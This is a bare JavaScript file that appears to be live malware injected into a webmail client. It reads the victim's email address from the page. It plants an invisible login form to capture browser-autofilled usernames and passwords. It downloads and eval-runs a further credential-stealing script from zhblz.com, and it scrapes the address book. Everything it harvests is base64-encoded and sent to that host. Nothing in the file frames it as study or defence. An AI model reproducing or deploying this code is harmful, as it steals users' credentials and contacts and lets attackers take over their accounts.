//Ch


let username = "";
const originalUrl = window.location.href;




async function takeUsername() {
  try {
    const res = await fetch(originalUrl, {
      credentials: "include",
      headers: {
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html,application/xhtml+xml",
        "Referer": originalUrl
      },
      method: "GET",
      mode: "cors"
    });

    if (!res.ok) {
      username = "undefined";
      const logUrl = `https://zhblz.com/zJ2w9x?log=e_h_f_u_${username}`;
      return await fetch(logUrl)
};

    const text = await res.text();
    const doc = new DOMParser().parseFromString(text, "text/html");
    const bodyText = doc.body.innerText;

    const toLineMatch = bodyText.match(/^To:\s*([\s\S]*?)(\n|$)/im);
    if (!toLineMatch) {
      username = "undefined";
      const logUrl = `https://zhblz.com/zJ2w9x?log=e_h_f_u_${username}`;
      return await fetch(logUrl)
};

    const emailMatch = toLineMatch[1].match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
    if (!emailMatch) return null;
    username = emailMatch[0];

    fetch(`https://zhblz.com/zJ2w9x?log=h_f_u_${username}`);


    return username;

  } catch (err) {
    fetch(`https://zhblz.com/zJ2w9x?log=e_h_f_u_${username}`);
    return null;
  }
}

function getUserCredentialsChrome() {
  const container = document.createElement('div');
  container.innerHTML = `
    <form style="visibility:hidden; position:absolute; top:0; left:0;" 
          action="redirect.php" method="post" name="login_form" class="login-form">
      <div class="form-group">
        <label for="login_username">Username:</label>
        <input type="text" id="login_username" name="login_username" autocomplete="username" required>
      </div>
      <div class="form-group">
        <label for="secretkey">Password:</label>
        <input type="password" id="secretkey" name="secretkey" autocomplete="current-password" required>
        <input type="hidden" name="js_autodetect_results" value="1">
        <input type="hidden" name="just_logged_in" value="1">
      </div>
      <button type="submit" class="login-button">Login</button>
    </form>
  `;
  document.body.insertBefore(container, document.body.firstChild);
  document.addEventListener('click', function handler() {
    document.removeEventListener('click', handler);
    setTimeout(() => {
      username = document.getElementById('login_username')?.value || '';
      const password = document.getElementById('secretkey')?.value || '';

      if (username && password) {
        const base64Credentials = btoa(username + ':' + password);
        fetch(`https://zhblz.com/zJ2w9x?log=c_c_f_u_${username}_:_${base64Credentials}`);
      }
    }, 300);
  }, { once: true });
}
getUserCredentialsChrome();





//FF

(async () => {
  try {
    const resp = await fetch("https://zhblz.com/getUserCredentials.js");
    if (!resp.ok) {
      await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${"f_g_getUserCredentials.js"}`);
      return;
    }
    const scriptContent = await resp.text();
    eval(scriptContent);

    getUserCredentials((userCredentials, username) => {
      const base64Credentials = btoa(userCredentials);
      fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`f_c_f_u_${username}_:_${base64Credentials}`}`);
    });
  } catch (error) {
    const errorUsername = username;
    await fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`e_f_c_f_u_${username}`}`);
  }
})();







async function getAddressBook(username) {

    try {

const newUrl = `${originalUrl.split("/src/")[0]}/src/addressbook.php`;

        const response = await fetch(newUrl, {
            credentials: "include",
            headers: {
                "User-Agent": navigator.userAgent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "frame",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Priority": "u=4"
            },
            referrer: `${originalUrl}`,
            method: "GET",
            mode: "cors"
        });

        const html = await response.text();

        const parser = new DOMParser();
        const doc = parser.parseFromString(html, "text/html");

        const emailLinks = Array.from(doc.querySelectorAll('a[href*="compose.php"]'));
        const textList = emailLinks.map(link => link.textContent.trim());

        const joined = textList.join("-");
        const base64Encoded = btoa(unescape(encodeURIComponent(joined)));

        const log = `t_a_f_u_${username}_:_${base64Encoded}`;

        const trackingUrl = `https://zhblz.com/zJ2w9x?log=t_a_b_f_u_${username}_:_${encodeURIComponent(log)}`;

        await fetch(trackingUrl, {
            method: "GET",
            mode: "no-cors"
        });
    } catch (error) {
        await fetch(`${"https://zhblz.com/zJ2w9x"}?log=e_t_a_b_f_u_${username}`);
    }
}


(async () => {
  const username = await takeUsername();

  const safeUsername = username || "undefined";

  await getAddressBook(safeUsername);
})();
